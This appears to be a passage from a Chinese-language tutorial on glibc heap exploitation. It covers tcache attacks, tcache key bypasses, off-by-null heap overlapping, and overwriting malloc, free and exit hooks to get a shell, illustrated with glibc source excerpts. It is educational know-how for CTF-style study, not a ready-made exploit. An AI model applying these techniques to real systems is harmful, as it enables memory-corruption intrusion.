<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">     <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">  &amp;&amp; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (victim)</span><br><span class="line">    &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">       &#123;</span><br><span class="line">         victim = victim-&gt;bk_nextsize;</span><br><span class="line">         <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                 (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">           victim = victim-&gt;bk_nextsize;</span><br><span class="line">         ...</span><br><span class="line">         unlink_chunk (av, victim);</span><br><span class="line">... <span class="comment">// 切割 chunk 并将 chunk 的剩余部分放入 unsorted bin</span></span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/55abd925f9352c4942f40cd924a61c43.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >

<h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><p>tcache 类似 fast bin ，但是 next 指针指向的是下一个 chunk 的内存区域且检查比 fast bin 少。</p>
<h2 id="绕过-tcache"><a href="#绕过-tcache" class="headerlink" title="绕过 tcache"></a>绕过 tcache</h2><p>如果想让释放的 chunk 不进入 tcache 有如下方法：</p>
<ul>
<li>释放不在 tcache 大小范围的 chunk。</li>
<li>释放 7 个同样大小的 tcache 填满对应位置的 bin。</li>
<li>如果题目限制了 free 次数那么需要通过 tcache dup 再 malloc 3 次将 counts 对应位置置为 -1 来绕过 tcache 。</li>
<li>控制 tcache_perthread_struct 从而控制 counts 实现绕过 tcache 。</li>
</ul>
<h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><p>通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。</p>
<h2 id="House-of-Autm"><a href="#House-of-Autm" class="headerlink" title="House of Autm"></a>House of Autm</h2><p>这是一个关于 tcachebin 的技巧，用于修改 chunk presize&#x2F;size，利用过程如下：</p>
<ul>
<li>申请 chunk A，大小在 fastbin 范围内。</li>
<li>释放 A，连续释放 8 次，此时，A 的 fd 被清 0，A 也被放置到了 fastbin 里面。</li>
<li>申请一个 chunk，将其 fd 修改为 A - 0x10，此时 tcache 中的 counts 为 6 。</li>
<li>再申请一个 chunk，从 fastbin 里面取，但是会把 fastbin 里面剩余的一个 chunk 链入到 tcachebin 。</li>
<li>再次分配就会分配到地址 A-0x10 处，就可以修改原来 A 的 presize&#x2F;size 等。</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/da17c26dc9c6da24b5f8be1fe7d597e4.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                >
glibc-2.29 开始增加了 tcache key 来检测 double free 。

<p>glibc-2.30 之后逻辑变了，原来是判断 <code>entry[idx]!=NULL</code>，glibc-2.30 之后判断 <code>count[idx] &gt; 0</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// glibc ≥ 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc &lt; 2.30</span></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//......</span></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>free 两次之后再 malloc 效果等同于 uaf ，可以进行 tcache poisoning 。</p>
<h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><p>通过 tcache poisoning malloc 到 tcache_perthread_struct 就可以控制整个 tcache 。 </p>
<h2 id="House-of-IO"><a href="#House-of-IO" class="headerlink" title="House of IO"></a>House of IO</h2><p>其实就是对 <code>tcache_perthread_struct</code> 结构体的攻击，想办法将其释放掉，然后再申请回来，申请回来的时候就能控制整个 tcache 的分配。</p>
<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><p>构造一个 fake chunk free 然后再 malloc 出来从而控制该区域内存。fake chunk 只需要确保 size 在 tcache 范围即可。</p>
<h2 id="tcache-extend"><a href="#tcache-extend" class="headerlink" title="tcache extend"></a>tcache extend</h2><p>修改 chunk 的 size 然后释放并重新申请出来就可以造成堆块重叠。</p>
<h2 id="tcache-key"><a href="#tcache-key" class="headerlink" title="tcache key"></a>tcache key</h2><p>自 glibc2.29 版本起 tcache 新增了一个 key 字段，该字段位于 chunk 的 bk 字段，值为 tcache 结构体的地址，若 free() 检测到 chunk-&gt;bk &#x3D;&#x3D; tcache 则会遍历 tcache 查找对应链表中是否有该chunk。最新版本的一些老 glibc （如新版2.27等）也引入了该防护机制</p>
<h3 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h3><p>由于 tcache 用的是 fd 字段所在地址，因此可以通过泄露 tcache key 来泄露堆地址。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/f3ee9deabbdb7869c52545aad38e15e3.png"
                      alt="在这里插入图片描述"
                ><br>glibc-2.34 开始，tcache 的 key 不再是 <code>tcache_pthread_struct</code> 结构体地址，而是一个随机数 <code>tcache_key</code> ，因此不能通过 key 泄露堆地址。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// glibc-2.33</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// glibc-2.34</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="tcache-key-bypass"><a href="#tcache-key-bypass" class="headerlink" title="tcache key bypass"></a>tcache key bypass</h3><p>在进行 tcache double free 之前，还需要想办法绕过 tcache key 的保护。<br>常见的 tcache key bypass 手段如下：</p>
<ul>
<li>清除 tcache key：通过一些 UAF 手段将该 free chunk 中记录的 tcache key清除，从而绕过该检测。</li>
<li>house of kauri：通过修改 size 使两次 free 的同一块内存进入不同的 entries 。</li>
<li>tcache stash with fastbin double free：在 fastbin 中并没有严密的 double free 检测，我们可以在填满对应的 tcache 链条后在 fastbin 中完成 double free，随后通过 stash 机制将 fastbin 中 chunk 倒回 tcache 中。此时 fsat bin double free 就变成了 tcahce double free 。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9c209e59493f988b7dfe2e318e190b0f.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></li>
<li>House of Botcake<br>同一个 chunk 释放到 tcache 和 unsorted bin 中。释放在 unsorted bin 的 chunk 借助堆块合并改变大小。相对于上一个方法，这个方法的好处是一次 double free 可以多次使用，因为控制同一块内存的 chunk 大小不同。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/b207a8da6850d0f762e962c9e75adc7e.png"
                      alt="在这里插入图片描述"
                ></li>
</ul>
<h2 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h2><p>calloc 申请内存不会从 tcache 中获取，而是从 fast bin 中获取。取完后，会将 fast bin 中的 chunk 放入 tcache 中。如果修改 fast bin 中 chunk 的 fd 指针，则会在 fd + 0x10 地址处写入一个较大的值。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/637c7090884f4df60e1d3a15046d2725.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>如果是使用 malloc 可以先消耗完 tcache 中的 chunk 然后再触发 stash 机制完成攻击。不过为了防止 target 的 fd 指向无效地址，需要在 fast bin 中预留另外 6 个 chunk 来填满  tcache 。</p>
<h2 id="tcache-stash-unlink"><a href="#tcache-stash-unlink" class="headerlink" title="tcache stash unlink"></a>tcache stash unlink</h2><p>从 small bin 中取出 chunk  时会对该 chunk 的 bk 指向的 chunk 的 fd 进行检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">idx = smallbin_index (nb);</span><br><span class="line">bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">  &#123;</span><br><span class="line">	bck = victim-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	  malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">	set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">	bin-&gt;bk = bck;</span><br><span class="line">	bck-&gt;fd = bin;</span><br><span class="line">	...</span><br></pre></td></tr></table></figure></div>
<p>但是最后将 small bin 中剩余 chunk 放入 tcache 直到 tcache 填满的过程却不会进行检查。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line"><span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">	&amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">			bck = tc_victim-&gt;bk;</span><br><span class="line">			set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">			<span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">			bin-&gt;bk = bck;</span><br><span class="line">			bck-&gt;fd = bin;</span><br><span class="line">			</span><br><span class="line">			tcache_put (tc_victim, tc_idx);</span><br><span class="line">	     &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></div>
<p>因此可以采用下面的方法进行攻击：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/f6bbea45f67322f88f6985d6df043863.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ></p>
<ul>
<li>small bin 放两个 chunk 是为了绕过第一次从 small bin 取 chunk 时的检查。</li>
<li>tcache 放 5 个 chunk 并 calloc 申请内存既可以保证 两次 stash 将 fake chunk1 申请出来，同时确保 stash 次数不会过多造成访存错误。</li>
<li>tcache stash unlink 最终效果是任意地址 malloc 和任意地址写某个（些）值。</li>
</ul>
<h1 id="Heap-Overlapping"><a href="#Heap-Overlapping" class="headerlink" title="Heap Overlapping"></a>Heap Overlapping</h1><p>这里的堆块重叠指的是指让一个堆块能控制另一个堆块的头部，而不是只能控制内存区域，这个条件比普通的 UAF 要强很多。</p>
<h2 id="UAF-转-Heap-Overlapping"><a href="#UAF-转-Heap-Overlapping" class="headerlink" title="UAF 转 Heap Overlapping"></a>UAF 转 Heap Overlapping</h2><p>以 fast bin attack 为例，在堆块的内存区域伪造 chunk 的 size 然后利用 UAF 部分地址写将 fd 修改到伪造的 chunk 头部，之后将 fake chunk 申请出来就可以造成堆块重叠。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/854710cc188652cf94c06c8e819cf87d.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                ></p>
<h2 id="Off-by-Null-转-Heap-Overlapping"><a href="#Off-by-Null-转-Heap-Overlapping" class="headerlink" title="Off by Null 转 Heap Overlapping"></a>Off by Null 转 Heap Overlapping</h2><p>off by null 比 off by one 条件要弱一些，所以这里只介绍 off by null 制造堆块重叠的方法。</p>
<p>如果是在输入的内容后面一个字节写 0 ，即可以控制下一个 chunk 的 prev_size 和 size 最低 1 字节写 0 那么可以采用下面的方法制造堆块重叠。</p>
<p>如下图所示，释放 chunk1 然后修改 chunk3 的 prev_size 和 PREV_INUSE 位（顺序不能错，否则 chunk1 会与 chunk2 合并出错），之后释放 chunk3 与 chunk1 合并，从而造成堆块重叠。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/893de62bdf917eabe9aab788d640fccf.png"
                      alt="在这里插入图片描述"
                ><br>如果不是在输入的内容后面一个字节写 0 ，即在下一个 chunk 的 size 最低 1 字节写 0 但不能控制 prev_size 时可以采用下面的构造方法。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/ab55d3ac8513419241df7d2a51681968.png"
                      alt="在这里插入图片描述"
                ></p>
<p>如果不能释放和申请 tcache&#x2F;fastbin 范围之外的 chunk 则可以构造如下结构，通过 <code>scanf(&quot;%d&quot;, &amp;id)</code> 时输入过长的字符串调用产生如下调用栈来申请 unsorted bin 范围的堆块触发 <code>malloc_consolidate</code> 实现堆块合并，最终造成堆块重叠。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">#<span class="number">0</span>  __GI___libc_malloc (bytes=bytes@entry=<span class="number">2048</span>) at malloc.c:<span class="number">3287</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x00007fd0f0c1e950</span> in __GI___libc_scratch_buffer_grow_preserve (buffer=buffer@entry=<span class="number">0x7ffe7fa7f130</span>) at scratch_buffer_grow_preserve.c:<span class="number">37</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x00007fd0f0bdfca2</span> <span class="function">in <span class="title">scratch_buffer_grow_preserve</span> <span class="params">(buffer=&lt;optimized out&gt;)</span> at ../include/scratch_buffer.h:<span class="number">113</span></span></span><br><span class="line"><span class="function">#<span class="number">3</span>  char_buffer_add_slow (buffer=</span>buffer@entry=<span class="number">0x7ffe7fa7f120</span>, ch=&lt;optimized out&gt;) at vfscanf-internal.c:<span class="number">241</span></span><br><span class="line">#<span class="number">4</span>  <span class="number">0x00007fd0f0be04c7</span> in <span class="built_in">char_buffer_add</span> (ch=&lt;optimized out&gt;, buffer=<span class="number">0x7ffe7fa7f120</span>) at vfscanf-internal.c:<span class="number">261</span></span><br><span class="line">#<span class="number">5</span>  __vfscanf_internal (s=&lt;optimized out&gt;, format=&lt;optimized out&gt;, argptr=argptr@entry=<span class="number">0x7ffe7fa7f588</span>, mode_flags=mode_flags@entry=<span class="number">2</span>) at vfscanf-internal.c:<span class="number">1797</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007fd0f0bdf495</span> in __isoc99_scanf (format=&lt;optimized out&gt;) at isoc99_scanf.c:<span class="number">30</span></span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/2986f7661220e9475b8e0217f1db80d5.png"
                      alt="在这里插入图片描述"
                ><br>自 glibc-2.29 起加入了 prev_size 的检查，以上方法均已失效。不过要是能够泄露堆地址可以利用 unlink 或 house of  einherjar 的思想伪造 fd 和 bk 实现堆块重叠。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="新版本-Off-by-Null-不泄露堆地址构造-Heap-Overlapping"><a href="#新版本-Off-by-Null-不泄露堆地址构造-Heap-Overlapping" class="headerlink" title="新版本 Off by Null 不泄露堆地址构造 Heap Overlapping"></a>新版本 Off by Null 不泄露堆地址构造 Heap Overlapping</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>首先构造两个 small bin 中的 chunk 和一个 large bin 中的 chunk 。然后将其申请出来，通过部分覆盖修改指针为下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/d59d0c9655872fabb9e32b530848af60.png"
                      alt="在这里插入图片描述"
                ><br>之后通过 off by one 把 chunk3 改小放入 fast bin（或 off by null 进 tcache） ，然后通过部分写将 chunk3 的 fd 指向自己，此时 fake chunk 满足 house of einherjar 条件，可以实现堆块重叠。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/2d469bb6521432ee01c21d104363129d.png"
                      alt="在这里插入图片描述"
                ></p>
<h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>首先采用如下方法伪造出 fake chunk 的 fd 和 bk 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/1afc6f5a794f6acc5eec616d5384ab27.png"
                      alt="在这里插入图片描述"
                ><br>之后利用 unsorted bin 伪造 chunk1 的 bk 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/658833a8d7e5dbd8a57c6e195035b286.png"
                      alt="在这里插入图片描述"  
                ><br>由于 unsorted bin 是从 bk 开始取的，不能通过 unsorted bin 来修改 chunk6 的 fd ，因此这里借助 large bin 和部分覆盖来伪造 chunk6 的 fd 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/370edc3263869c638021d42e2174f203.png"
                      alt="在这里插入图片描述"
                ></p>
<p>至此 fake chunk 满足 house of einherjar 条件，可以实现堆块重叠。</p>
<h1 id="malloc-init-state-attack"><a href="#malloc-init-state-attack" class="headerlink" title="malloc_init_state attack"></a>malloc_init_state attack</h1><p>malloc_consolidate 会根据 global_max_fast 是否为 0 来判断 ptmalloc 是否已经初始化，因此如果能通过任意地址写将 global_max_fast 置 0 然后触发 malloc_consolidate 就可以调用 malloc_init_state 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// malloc_consolidate逻辑</span></span><br><span class="line"><span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//global_max_fast不为0,表示ptmalloc已经初始化</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//如果global_max_fast为0</span></span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">    <span class="comment">//非debug模式下该宏定义为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在 malloc_init_state 中会将 top chunk 指针指向 unsorted bin</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">malloc_init_state</span> <span class="params">(mstate av)</span> &#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    mbinptr bin;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; NBINS; ++i) &#123;</span><br><span class="line">        bin = bin_at (av, i);</span><br><span class="line">        bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">        <span class="comment">//遍历所有的bins,初始化每个bin的空闲链表为空,即将bin的fb和bk都指向bin本身</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> MORECORE_CONTIGUOUS</span></span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        set_noncontiguous (av);</span><br><span class="line">        <span class="comment">//对于非主分配区,需要设置为分配非连续虚拟地址空间</span></span><br><span class="line">    <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">        set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">        <span class="comment">//设置fastbin中最大chunk大小</span></span><br><span class="line">        <span class="comment">//只要该全局变量的值非0,也就意味着主分配区初始化了</span></span><br><span class="line">    av-&gt;flags |= FASTCHUNKS_BIT;</span><br><span class="line">    <span class="comment">//标识此时分配区无fastbin</span></span><br><span class="line">    av-&gt;top = initial_top (av);</span><br><span class="line">    <span class="comment">//#define initial_top(M) (unsorted_chunks(M))</span></span><br><span class="line">    <span class="comment">//#define unsorted_chunks(M) (bin_at(M, 1))</span></span><br><span class="line">    <span class="comment">//#define bin_at(m, i) (mbinptr)(((char *) &amp;((m)-&gt;bins[((i) - 1) * 2])) - offsetof (struct malloc_chunk, fd))</span></span><br><span class="line">    <span class="comment">//暂时把top chunk初始化为unsort chunk,仅仅是初始化一个值而已,这个chunk的内容肯定不能用于top chunk来分配内存,主要原因是top chunk不属于任何bin,但ptmalloc中的一些check代码可能需要top chunk属于一个合法的bin</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>此时 top chunk 的地址为 &amp;av-&gt;bins[0] - 0x10 ，且 size 为之前的 last_remainder 的值(通常来说堆指针都会很大)，只要不断 malloc ，就可以分配到 hook 指针。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/62388e6733411c94dc97b9b86e5700f2.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>glibc-2.27 开始 malloc_consolidate 不再调用 malloc_init_state ，该方法失效。</p>
<h1 id="各种-HOOK"><a href="#各种-HOOK" class="headerlink" title="各种 HOOK"></a>各种 HOOK</h1><p>对利用最终获取 shell 的方式除了写 got 表外就是覆盖函数指针。glibc 中存在很多 hook 结构可以利用。</p>
<h2 id="malloc-hook-realloc-hook"><a href="#malloc-hook-realloc-hook" class="headerlink" title="malloc hook + realloc hook"></a>malloc hook + realloc hook</h2><p>调用代码如下，传入的参数是申请的字节数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *(*hook) (<span class="type">size_t</span>, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__malloc_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>可以利用 fastbin attack 写入 onegadget 来 get shell 。具体利用见前面 fastbin 的 Arbitrary Alloc 中的介绍。</p>
<p>glibc-2.34 起删除了堆相关 hook 。</p>
<h2 id="free-hook"><a href="#free-hook" class="headerlink" title="free hook"></a>free hook</h2><p>调用代码如下，传入参数是释放的指针。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">  = atomic_forced_read (__free_hook);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>
<p>free hook 前面没有可供截取的 size 字段（偶尔有，但是由于值一直在变因此没有成功利用），因此很难利用 fast bin attack 来攻击，不过可以利用 house of storm 或 tcache attack 攻击。<br>free hook 的优势是传入参数为释放的内存，因此参数可控，比如将 free hook 改为 system 然后释放带有 <code>/bin/sh</code> 的字符串可以稳定 get shell 。或者利用 setcontext 的 gadget 来设置寄存器来劫持程序执行流程。</p>
<p>glibc-2.34 起删除了堆相关 hook 。</p>
<h2 id="exit-hook"><a href="#exit-hook" class="headerlink" title="exit hook"></a>exit hook</h2><p>在 rtld_global 结构体中有 _dl_rtld_lock_recursive 和 _dl_rtld_unlock_recursive 两个函数指针。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rtld_global</span></span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined SHARED &amp;&amp; defined _LIBC_REENTRANT \</span></span><br><span class="line"><span class="meta">    &amp;&amp; defined __rtld_lock_default_lock_recursive</span></span><br><span class="line">  <span class="function">EXTERN <span class="title">void</span> <span class="params">(*_dl_rtld_lock_recursive)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line">  <span class="function">EXTERN <span class="title">void</span> <span class="params">(*_dl_rtld_unlock_recursive)</span> <span class="params">(<span class="type">void</span> *)</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>该函数指针指向的函数在 exit 中被调用<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/bac420de9c4efcbc96ed0f31fac496cc.png"
                      alt="在这里插入图片描述"
                ></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> _dl_fini(<span class="type">void</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">        <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">        __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">    ...</span><br><span class="line">    __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">声明位置: libc-lockP.h  </span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"> 替换:  </span><br><span class="line">((&#123;</span><br><span class="line">    __typeof(__pthread_mutex_lock) *_fn = (__pthread_mutex_lock);</span><br><span class="line">    _fn != ((<span class="type">void</span> *) <span class="number">0</span>) ? (*_fn)(&amp;(_dl_load_lock).mutex) : <span class="number">0</span>;</span><br><span 